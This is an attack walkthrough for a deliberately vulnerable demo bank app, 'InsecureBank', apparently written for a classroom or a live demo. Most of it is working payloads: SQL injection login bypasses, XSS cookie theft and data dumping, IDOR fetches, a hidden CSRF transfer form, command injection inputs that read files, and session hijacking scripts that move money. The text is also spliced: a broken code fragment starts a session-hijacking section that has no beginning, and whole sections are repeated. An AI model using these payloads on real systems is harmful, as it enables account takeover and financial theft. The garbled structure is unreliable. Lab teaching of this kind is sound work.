# Attack Execution Guide

Quick reference for executing security attacks on InsecureBank.

---

## 📑 Table of Contents

1. [SQL Injection](#-attack-1-sql-injection)
2. [Cross-Site Scripting (XSS)](#-attack-2-cross-site-scripting-xss)
3. [IDOR (Insecure Direct Object Reference)](#-attack-3-idor-insecure-direct-object-reference)
4. [CSRF (Cross-Site Request Forgery)](#-attack-4-csrf-cross-site-request-forgery)
5. [Command Injection](#-attack-5-command-injection)
6. [Privilege Escalation](#-attack-6-privilege-escalation)
7. [Session Hijacking](#-attack-7-session-hijacking)
8. [Monitoring Attacks](#-monitoring-attacks)
9. [Reset Instructions](#-reset-instructions)

---
---

## 🎯 Attack 1: SQL Injection

### Username Field Bypass
1. Go to `http://localhost:5173/login`
2. **Username:** `admin' OR 1=1 --`
3. **Password:** `anything`
4. Click **Sign in**
5. ✅ Logged in as admin

### Password Field Bypass
1. Go to `http://localhost:5173/login`
2. **Username:** `admin`
3. **Password:** `' OR 1=1 --`
4. Click **Sign in**
5. ✅ Logged in as admin

### Comment Bypass
1. Go to `http://localhost:5173/login`
2. **Username:** `admin'--`
3. **Password:** `anything`
4. Click **Sign in**
5. ✅ Logged in as admin

### Union-Based Extraction
1. Go to `http://localhost:5173/login`
2. **Username:** `' UNION SELECT * FROM users --`
3. **Password:** `anything`
4. Click **Sign in**
5. ✅ Check SQL console for results

---
---

## 🎯 Attack 2: Cross-Site Scripting (XSS)

### Profile XSS (Stored)
1. Login with any account
2. Go to **Profile**
3. In **Full Name** field, paste:
   ```html
   <img src=x onerror="console.log('Stolen Cookie:', document.cookie)">
   ```
4. Click **Update Profile** and confirm
5. Refresh the page
6. Press **F12** → **Console** tab
7. ✅ Cookie displayed once in console (app prevents duplicates)

### Search XSS (Reflected)
1. Login to the bank
2. Go to **Transfer Money**
3. In **Search Users** field, paste:
   ```html
   <img src=x onerror=alert('XSS Attack!')>
   ```
4. Click **Search**
5. ✅ Alert executes immediately

### Cookie Theft XSS (Transfer Page)
1. Login to the bank
2. Go to **Transfer Money**
3. In **Search Users** field, paste:
   ```html
   <img src=x onerror="console.log('Stolen Cookie:', document.cookie)">
   ```
4. Click **Search**
5. Press **F12** → **Console** tab
6. ✅ Cookie displayed in console

### Advanced Data Exfiltration
1. Login to the bank
2. Go to **Transfer Money**
3. In **Search Users** field, paste:
   ```html
   <img src=x onerror="if(!window.xssExecuted){window.xssExecuted=true;(async()=>{try{const api='http://localhost:5000';console.log('[XSS] cookie=',document.cookie);const r=await fetch(api+'/api/admin/users',{credentials:'include'});const users=await r.json();console.log('[XSS] users:',users);}catch(e){console.error('[XSS] error',e);}})()}">
   ```
4. Click **Search**
5. ✅ Check XSS console for complete database dump

---
---

## 🎯 Attack 3: IDOR (Insecure Direct Object Reference)

### View Other Users' Transactions
1. Login as `john_doe` (password: `password`)
2. Press **F12** to open Developer Tools
3. Go to **Console** tab
4. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/transactions/1', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
5. ✅ See admin's transactions (user ID 1)

### View Any User's Profile
1. Login as any user
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/user/1', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ See admin's profile data

### Access Admin User List
1. Login as regular user (not admin)
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/admin/users', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ See all users including passwords

### Delete Other Users
1. Login as regular user
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/admin/user/3', {
     method: 'DELETE',
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ User ID 3 deleted

---
---

## 🎯 Attack 4: CSRF (Cross-Site Request Forgery)

### Money Transfer Attack
1. Create file `attack.html` on your computer
2. Paste this code:
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>You Won $1000!</title></head>
   <body>
       <h1>Congratulations! Click to claim your prize!</h1>
       <form id="sneaky" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">
           <input name="fromUserId" value="2">
           <input name="toUsername" value="ycp27">
           <input name="amount" value="1000">
           <input name="description" value="CSRF Attack">
       </form>
       <script>
           setTimeout(() => {
               document.getElementById('sneaky').submit();
               alert('Money transferred!');
           }, 2000);
       </script>
   </body>
   </html>
   ```
3. Have victim login to bank
4. Victim opens `attack.html`
5. ✅ Money automatically transferred

---
---

## 🎯 Attack 5: Command Injection

### Database Dump
1. Login to bank (use SQL injection: `admin' OR 1=1 --`)
2. Go to **Transaction History**
3. In **Search Transactions** field, type: `dump_users`
4. Click **Search**
5. ✅ Check command console for user database

### File Discovery
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `dir`
3. Click **Search**
4. ✅ See directory listing

### Read Sensitive Files
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `type users.json`
3. Click **Search**
4. ✅ See user database contents

### System Information
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `whoami`
3. Click **Search**
4. ✅ See current system user

### Network Information
1. Go to **Transaction History**
2. In **Search Transactions** field, type: `ipconfig`
3. Click **Search**
4. ✅ See network configuration

---
---

## 🎯 Attack 6: Privilege Escalation

### Access Admin Functions as Regular User
1. Login as `john_doe` (password: `password`)
2. Press **F12** → **Console**
3. Paste and press Enter:
   ```javascript
   fetch('http://localhost:5000/api/admin/users', {
     credentials: 'include'
   }).then(r => r.json()).then(console.log)
   ```
4. ✅ Access admin-only data

---
---

## 📊 Monitoring Attacks

### SQL Injection Console
- Appears on login page when SQL injection detected
- Shows query executed and injection type

### XSS Console
- Appears on Transfer Money page
- Shows cookie theft and data exfiltration

### Command Injection Console
- Appears on Transaction History page
- Shows command output and system information

---
---

## 🔄 Reset Instructions

### Reset Database
```bash
cd demo-files
mysql -u root -p vulnerable_bank < manual-db-setup.sql
```

### Clear Browser Data
1. Press **F12** → **Application** → **Storage**
2. Click **Clear site data**
3. Refresh page

---

**⚠️ Remember: These attacks are for educational purposes only!**${data.length} transactions`);
});
```
✅ Shows all victim's financial transactions

**C) Transfer Money from Victim's Account**
```javascript
// In Console, paste (change 'admin' to your username):
fetch('http://localhost:5000/api/transfer', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    fromUserId: 2,
    toUsername: 'admin',
    amount: 1000,
    description: 'Stolen via session hijacking'
  })
}).then(r => r.json()).then(data => {
  console.log("💸 Transfer Result:", data);
  alert('Money transferred successfully!');
});
```
✅ Transfers $1000 from victim to your account

**D) Decode the JWT Token (See What's Inside)**
```javascript
// In Console, paste your stolen token:
const token = "PASTE_YOUR_STOLEN_TOKEN_HERE";
const decoded = JSON.parse(atob(token.split('.')[1]));
console.log("🔓 Decoded Token:", decoded);
alert(`User ID: ${decoded.userId}\nUsername: ${decoded.username}`);
```
✅ Reveals user ID and username from the token

**E) Access Admin Panel (Privilege Escalation)**
```javascript
// In Console, paste:
fetch('http://localhost:5000/api/admin/users', {
  credentials: 'include'
}).then(r => r.json()).then(users => {
  console.log("🔥 Complete Database:", users);
  alert(`Database breached! ${users.length} users exposed with passwords!`);
});
```
✅ Dumps entire user database including passwords

---

#### **Phase 4: Show Persistence**

**Save Cookie for Later Use**
```javascript
// Save stolen session
localStorage.setItem('stolen_session', document.cookie);
alert('Session saved! Can be used anytime.');
```

**Use Saved Cookie Later**
```javascript
// Restore stolen session (works even after victim logs out)
document.cookie = localStorage.getItem('stolen_session');
location.reload();
```
✅ Shows the attack persists until token expires

---

### 🎬 Presentation Script for Live Demo

**For Non-Technical Audience:**

1. **Setup (1 min)**
   - "I'm logged in as John Doe, a regular bank customer"
   - Show balance: $10,000

2. **The Attack (2 min)**
   - "Watch what happens when I search for a user with this special code"
   - Paste XSS payload
   - "The XSS Console shows my session cookie was stolen"
   - "This cookie is like a digital key to my account"

3. **The Hijacking (2 min)**
   - Open incognito window
   - "Now I'm the attacker on a different computer"
   - "I paste the stolen cookie and..."
   - Refresh page
   - "I'm logged in as John Doe without knowing his password!"

4. **The Impact (3 min)**
   - "I can see all his information"
   - Run profile fetch
   - "I can see all his transactions"
   - Run transaction fetch
   - "I can even transfer money from his account"
   - Execute transfer
   - "And access the entire database"
   - Run admin users fetch

5. **The Lesson (1 min)**
   - "This is why websites must:"
   - "✓ Sanitize user input (prevent XSS)"
   - "✓ Use HttpOnly cookies (prevent JavaScript access)"
   - "✓ Implement proper session management"
   - "✓ Use HTTPS everywhere"

---

### 🔑 Key Takeaways

**Why This Works:**
- ❌ No input sanitization (XSS vulnerability)
- ❌ Cookies accessible via JavaScript (httpOnly: false)
- ❌ No CSRF protection
- ❌ No session validation
- ❌ Weak JWT secret

**Real-World Impact:**
- 🔴 Complete account takeover
- 🔴 Financial theft
- 🔴 Identity theft
- 🔴 Data breach
- 🔴 Privacy violation

**How to Prevent:**
- ✅ Sanitize ALL user inputs
- ✅ Use HttpOnly and Secure cookies
- ✅ Implement CSRF tokens
- ✅ Use strong JWT secrets
- ✅ Implement session timeout
- ✅ Monitor for suspicious activity
- ✅ Use Content Security Policy (CSP)

---

### 📱 Alternative: Manual Cookie Theft

**Method 2: Direct Cookie Access**
1. Login to bank
2. Press **F12** → **Application** tab → **Cookies**
3. Find `auth_token` cookie
4. Copy the value
5. Open incognito window
6. Go to bank website
7. Press **F12** → **Console**
8. Paste: `document.cookie = "auth_token=PASTE_TOKEN_HERE"`
9. Refresh page
10. ✅ Logged in without password

---
---

## 📊 Monitoring Attacks

### SQL Injection Console
- Appears on login page when SQL injection detected
- Shows query executed and injection type

### XSS Console
- Appears on Transfer Money page
- Shows cookie theft and data exfiltration

### Command Injection Console
- Appears on Transaction History page
- Shows command output and system information

---
---

## 🔄 Reset Instructions

### Reset Database
```bash
cd demo-files
mysql -u root -p vulnerable_bank < manual-db-setup.sql
```

### Clear Browser Data
1. Press **F12** → **Application** → **Storage**
2. Click **Clear site data**
3. Refresh page

---

**⚠️ Remember: These attacks are for educational purposes only!**
